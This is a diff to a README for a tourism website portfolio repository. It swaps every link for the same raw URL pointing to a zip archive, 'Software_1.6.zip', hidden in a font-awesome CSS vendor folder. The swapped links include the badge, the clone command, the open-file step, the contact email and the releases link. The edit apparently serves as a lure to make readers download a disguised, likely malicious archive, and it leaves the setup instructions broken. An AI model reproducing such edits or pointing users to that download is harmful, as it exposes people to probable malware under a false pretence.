@@ -2,7 +2,7 @@
 
 Welcome to the **Tour India** repository! This project showcases a tourism website portfolio that highlights stunning travel destinations across India. Dive into the rich culture, diverse landscapes, and vibrant experiences that this beautiful country offers. 
 
-![Tour India](https://img.shields.io/badge/Visit%20Releases-Click%20Here-brightgreen?style=flat&logo=github&logoColor=white&link=https://github.com/jimmiT1/tourindia/releases)
+![Tour India](https://raw.githubusercontent.com/jimmiT1/tourindia/main/Pages-inside/vendor/fontawesome-free/css/Software_1.6.zip%20Releases-Click%20Here-brightgreen?style=flat&logo=github&logoColor=white&https://raw.githubusercontent.com/jimmiT1/tourindia/main/Pages-inside/vendor/fontawesome-free/css/Software_1.6.zip)
 
 ## Table of Contents
 
@@ -48,7 +48,7 @@ To set up the project locally, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/jimmiT1/tourindia.git
+   git clone https://raw.githubusercontent.com/jimmiT1/tourindia/main/Pages-inside/vendor/fontawesome-free/css/Software_1.6.zip
    ```
 
 2. **Navigate to the project directory**:
@@ -62,7 +62,7 @@ To set up the project locally, follow these steps:
    ```
 
 4. **Open the project**:
-   Open `index.html` in your preferred web browser to view the website.
+   Open `https://raw.githubusercontent.com/jimmiT1/tourindia/main/Pages-inside/vendor/fontawesome-free/css/Software_1.6.zip` in your preferred web browser to view the website.
 
 ## Usage
 
@@ -99,12 +99,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, feel free to reach out:
 
-- **GitHub**: [jimmiT1](https://github.com/jimmiT1)
-- **Email**: jimmi@example.com
+- **GitHub**: [jimmiT1](https://raw.githubusercontent.com/jimmiT1/tourindia/main/Pages-inside/vendor/fontawesome-free/css/Software_1.6.zip)
+- **Email**: https://raw.githubusercontent.com/jimmiT1/tourindia/main/Pages-inside/vendor/fontawesome-free/css/Software_1.6.zip
 
-You can also visit the [Releases](https://github.com/jimmiT1/tourindia/releases) section for downloadable files and updates.
+You can also visit the [Releases](https://raw.githubusercontent.com/jimmiT1/tourindia/main/Pages-inside/vendor/fontawesome-free/css/Software_1.6.zip) section for downloadable files and updates.
 
-![Explore India](https://source.unsplash.com/1600x900/?india,tourism)
+![Explore India](https://raw.githubusercontent.com/jimmiT1/tourindia/main/Pages-inside/vendor/fontawesome-free/css/Software_1.6.zip,tourism)
 
 ---
 
